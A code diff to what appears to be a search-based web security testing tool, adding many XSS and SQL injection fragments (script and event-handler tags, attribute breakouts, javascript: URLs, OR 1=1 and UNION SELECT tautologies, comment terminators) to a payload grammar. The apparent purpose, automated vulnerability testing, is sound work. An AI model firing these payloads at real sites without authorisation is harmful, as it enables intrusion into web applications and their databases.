@@ -17,7 +17,8 @@ from dataclasses import dataclass, field
 GRAMMARS = {
     "xss": {
         "pre":  ["", '"', "'", ">", '">', "'>", "</title>", "</textarea>",
-                 "</style>", "</script>", "`", "\\"],
+                 "</style>", "</script>", "`", "\\", "</div>", "</a>", "</option>",
+                 "</noscript>", '"><', "'><", "--><", " "],
         "core": [
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
@@ -28,16 +29,27 @@ GRAMMARS = {
             "<video><source onerror=alert(1)>",
             "<details open ontoggle=alert(1)>",
             "<marquee onstart=alert(1)>",
+            "<audio src=x onerror=alert(1)>",
+            "<a href=javascript:alert(1)>x</a>",
+            "<input autofocus onfocus=alert(1)>",
+            "<select autofocus onfocus=alert(1)>",
+            "<textarea autofocus onfocus=alert(1)>",
+            "<object data=javascript:alert(1)>",
+            "<embed src=javascript:alert(1)>",
+            "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x",
+            "<img src=`x`onerror=alert(1)>",
             # attribute-breakout cores (needed when input lands inside value="...")
             '" onmouseover=alert(1) x="',
             "' onmouseover=alert(1) x='",
             '" autofocus onfocus=alert(1) x="',
             "' autofocus onfocus=alert(1) x='",
+            '" onerror=alert(1) src=x="',
         ],
-        "post": ["", "<!--", "//", '"', "'", ">", "/>"],
+        "post": ["", "<!--", "//", '"', "'", ">", "/>", "`>", '")', "')", "\\", " "],
     },
     "sqli": {
-        "pre":  ["", "'", '"', ")", "')", '")', "'))", "1'"],
+        "pre":  ["", "'", '"', ")", "')", '")', "'))", "1'", "1", "0", "1)",
+                 "admin'", "1 ", "')) "],
         "core": [
             " OR 1=1",
             " OR '1'='1",
@@ -47,8 +59,15 @@ GRAMMARS = {
             " OR 1=1-- ",
             " OR 'a'='a",
             " UNION SELECT NULL,NULL",
+            " OR 1=1#",
+            " UNION SELECT 1,2,3",
+            " OR 'x'='x",
+            " || 1=1",
+            " OR SLEEP(0)",
+            " AND '1'='1",
+            " OR 1=1 LIMIT 1",
         ],
-        "post": ["", "-- ", "#", "/*", ";", "-- -", "%00"],
+        "post": ["", "-- ", "#", "/*", ";", "-- -", "%00", ")-- ", "'-- ", "')-- "],
     },
     # Clickjacking is header-based, not payload-based; a trivial grammar lets the
     # search algorithms create individuals uniformly, while the oracle ignores the
